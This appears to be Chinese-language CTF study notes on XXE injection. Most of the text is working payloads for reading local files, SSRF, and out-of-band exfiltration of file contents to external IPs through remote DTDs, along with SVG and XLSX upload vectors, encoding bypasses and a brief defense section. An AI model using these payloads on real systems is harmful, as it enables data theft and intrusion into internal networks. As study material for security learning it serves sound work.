# XML 外部实体 (XXE) 注入

[CTF XXE - MustaphaMond - 博客园 (cnblogs.com)](https://www.cnblogs.com/20175211lyz/p/11413335.html)

## XML

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。

## XXE

XXE漏洞全称XML External Entity Injection,即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

## XML与HTML的主要差异

XML被设计为传输和存储数据，其焦点是数据的内容。
HTML被设计用来显示数据，其焦点是数据的外观。
HTML旨在显示信息而XML旨在传输信息。

## 漏洞原理：

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

## XXE 攻击有哪些类型？

XXE 攻击有多种类型：

- 利用 XXE 检索文件，其中定义了包含文件内容的外部实体，并在应用程序的响应中返回。
- 利用 XXE 执行 SSRF 攻击，其中外部实体是基于后端系统的 URL 定义的。
- 利用盲 XXE 带外泄露数据，其中敏感数据从应用程序服务器传输到攻击者控制的系统。
- 利用盲 XXE 通过错误消息检索数据，攻击者可以在其中触发包含敏感数据的解析错误消息。

## 玩法

1、读取文件：

```xml
<?xml version="1.0"?>

<!DOCTYPE Mikasa [
<!ENTITY test SYSTEM  "file:///d:/e.txt">
]>
<user><username>&test;</username><password>Mikasa</password></user>



```

1.1、带外测试：

```xml
<?xml version="1.0" ?>

<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://9v57ll.dnslog.cn">
    %file;
]>
<user><username>&send;</username><password>Mikasa</password></user>


```

2、外部引用实体dtd：

```xml
<?xml version="1.0" ?>

<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd">
    %file;
]>
<user><username>&send;</username><password>Mikasa</password></user>


evil2.dtd：

<!ENTITY send SYSTEM "file:///d:/e.txt">
```

3、无回显读文件

```xml
<?xml version="1.0"?>

<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///d:/e.txt">
<!ENTITY % remote SYSTEM "http://47.94.236.117/test.dtd">
%remote;
%all;
]>
<root>&send;</root>
test.dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://47.94.236.117/get.php?file=%file;'>">


```

4、利用 XXE 执行 SSRF 攻击
除了检索敏感数据外，XXE 攻击的另一个主要影响是它们可用于执行服务器端请求伪造 (SSRF)。这是一个潜在的严重漏洞，可以诱导服务器端应用程序向服务器可以访问的任何 URL 发出 HTTP 请求。
在以下 XXE 示例中，外部实体将导致服务器向组织基础设施内的内部系统发出后端 HTTP 请求：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

5、通过文件上传进行 XXE 攻击
一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式的示例是办公文档格式（如 DOCX）和图像格式（如 SVG）。
例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收 PNG 或 JPEG 等格式，正在使用的图像处理库也可能支持 SVG 图像。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而达到 XXE 漏洞的隐藏攻击面
例如：使用以下内容创建本地 SVG 图像：

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ 
	<!ENTITY xxe SYSTEM "file:///etc/hostname" > 
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

在博客文章上发表评论，并将此图片作为头像上传。
当您查看评论时，您应该会在图像中看到/etc/hostname文件的内容。

## 绕过方式

ENTITY``SYSTEM``file等关键词被过滤**

使用编码方式绕过：UTF-16BE
`cat payload.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml`

若http被过滤，可以

data://协议绕过**

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % a " <!ENTITY %  b SYSTEM 'http://118.25.14.40:8200/hack.dtd'> "> 
    %a;
    %b;
]>
<test>&hhh;</test>
```

file://协议加文件上传**

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % a SYSTEM "file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg">
    %a;
]>
<!--上传文件-->
<!ENTITY % b SYSTEM 'http://118.25.14.40:8200/hack.dtd'>
```

php://filter协议加文件上传**

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % a SYSTEM "php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg">
    %a;
]>
    <test>
        &hhh;
    </test>

<!--上传文件-->
<!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'>
```

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % a SYSTEM "php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg">
    %a;
]>
    <test>
        &hhh;
    </test>
<!--上传文件-->
PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==
```

```
PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==
```

## 利用场景

svg

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```

tips:从当前文件夹读取文件可以使用`/proc/self/cwd`

excel

[利用EXCEL进行XXE攻击](https://xz.aliyun.com/t/3741)
首先用excel创建一个空白的xlsx，然后解压

```
mkdir XXE && cd XXE
unzip ../XXE.xlsx
```

将`[Content_Types].xml`改成恶意xml，再压缩回去

```
zip -r ../poc.xlsx *
```

## XXE防御

[未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)

- 方案一、使用开发语言提供的禁用外部实体的方法
  PHP：libxml_disable_entity_loader(true);
  其他语言:https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet
- 方案二、过滤用户提交的XML数据
  关键词：`，`,`SYSTEM`和`PUBLIC`。
